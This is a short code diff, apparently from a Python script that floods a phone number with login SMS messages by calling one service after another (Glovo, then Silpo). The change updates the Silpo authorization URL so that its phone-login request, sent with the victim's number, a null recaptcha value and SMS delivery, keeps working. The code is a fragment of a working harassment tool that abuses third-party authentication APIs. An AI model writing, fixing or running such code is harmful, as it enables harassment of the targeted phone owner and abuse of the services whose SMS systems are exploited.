@@ -113,7 +113,7 @@ def start():
             print(fail + "Glovo не отправлен!" + Style.RESET_ALL)
         try:
             requests.post(
-                "https://auth.silpo.ua/api/v1/Login/ByPhone?returnUrl=https%3A%2F%2Fauth.silpo.ua%2Fconnect%2Fauthorize%2Fcallback%3Fclient_id%3Dsilpo--site--spa%26redirect_uri%3Dhttps%253A%252F%252Fsilpo.ua%252Fsignin-callback-angular.html%26response_type%3Dcode%26scope%3Dpublic-my%2520openid%26nonce%3D540b39979eff660f857bc8cccc12f1b26ddUPKgeB%26state%3D74562a19383f682759eacd02cf73995a9cwWGx2TJ%26code_challenge%3D9qnFlWhdfz4FWKP05WKNgnEt0frRBRY3r0bIRsEC-LM%26code_challenge_method%3DS256",
+                "https://auth.silpo.ua/connect/authorize/callback?client_id=silpo--site--spa&redirect_uri=https%3A%2F%2Fsilpo.ua%2Fsignin-callback-angular.html&response_type=code&scope=public-my%20openid&nonce=282bc2469397aefc7bb391390d1dfc24703XZoqg0&state=74562a19383f682759eacd02cf73995a9cwWGx2TJ&code_challenge=dnGtqSBgymuOZY6kP2AaxJpxiJDage4LXEF6PuE4Hw0&code_challenge_method=S256",
                 json={'phone': phone[3:], 'recaptcha': 'null', 'delivery_method': "sms", 'phoneChannelType': '0'},
                 headers=head,
                 timeout=2,
